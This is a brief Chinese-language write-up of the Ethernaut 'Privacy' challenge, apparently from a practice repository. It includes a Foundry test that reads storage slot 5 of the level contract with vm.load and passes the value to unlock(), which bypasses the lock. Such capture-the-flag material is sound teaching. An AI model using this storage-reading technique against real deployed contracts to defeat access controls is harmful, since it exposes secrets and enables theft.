与 Vault 类似，从链上数据中可以得到合约中的变量数据。在 solidity 中每个 slot 可以存储 32 bytes 的数据。用合适的下标访问即可。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Privacy.sol";
import "src/levels/PrivacyFactory.sol";

contract TestPrivacy is BaseTest {
    Privacy private level;

    constructor() public {
        levelFactory = new PrivacyFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = Privacy(levelAddress);

        assertEq(level.locked(), true);
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        bytes32 data = vm.load(address(level), bytes32(uint256(5)));
        level.unlock(bytes16(data));

        vm.stopPrank();
    }
}
```

